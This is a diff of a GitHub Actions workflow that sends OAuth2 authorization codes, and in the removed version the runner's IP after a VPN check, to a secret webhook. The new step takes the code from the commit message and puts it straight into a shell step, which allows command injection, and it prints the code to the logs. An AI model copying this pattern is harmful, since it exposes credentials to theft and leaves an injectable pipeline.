@@ -10,39 +10,27 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - name: Checkout repository
-        uses: actions/checkout@v2
+    - name: Checkout repository
+      uses: actions/checkout@v2
 
-      - name: Set up Node.js
-        uses: actions/setup-node@v2
-        with:
-          node-version: '14'
+    - name: Set up environment variables
+      run: |
+        echo "WEBHOOK_URL=${{ secrets.WEBHOOK_URL }}" >> $GITHUB_ENV
 
-      - name: Install dependencies
-        run: npm install
+    - name: Extract code from commit message
+      id: extract-code
+      run: |
+        commit_message=$(git log -1 --pretty=%B)
+        code=$(echo "$commit_message" | grep -oP '(?<=code=)[^\s]+')
+        echo "::set-output name=code::$code"
 
-      - name: Start server and expose local endpoint
-        run: npm start  # Adjust as per your setup, this starts a local server
+    - name: Execute send_webhook script
+      if: steps.extract-code.outputs.code != ''
+      run: |
+        code=${{ steps.extract-code.outputs.code }}
+        ip=$(curl -s https://api64.ipify.org)
 
-      - name: Get IP and Check VPN/Proxy
-        id: ip-check
-        run: |
-          ip=$(curl -s https://api64.ipify.org)
-          json=$(curl -s https://ipinfo.io/${ip}/json)
-          echo "::set-output name=ip::${ip}"
-          echo "::set-output name=isVPNProxy::$(echo ${json} | jq '.proxy // .vpn // false')"
-
-      - name: Send Webhook
-        if: ${{ steps.ip-check.outputs.isVPNProxy == 'false' }}
-        env:
-          WEBHOOK_URL: ${{ secrets.WEBHOOK_URL }}
-        run: |
-          code=$(curl -s http://localhost:3000/code)  # Replace with your endpoint
-          ip=${{ steps.ip-check.outputs.ip }}
-
-          if [ -n "$code" ]; then
-            echo "Authorization code: $code"
-            curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"New OAuth2 code: $code\nIP Address: $ip\"}" $WEBHOOK_URL
-          else
-            echo "No authorization code to send."
-          fi
+        echo "Authorization code: $code"
+        curl -X POST -H "Content-Type: application/json" -d "{\"content\":\"New OAuth2 code: $code\"}" $WEBHOOK_URL
+      env:
+        WEBHOOK_URL: ${{ secrets.WEBHOOK_URL }}
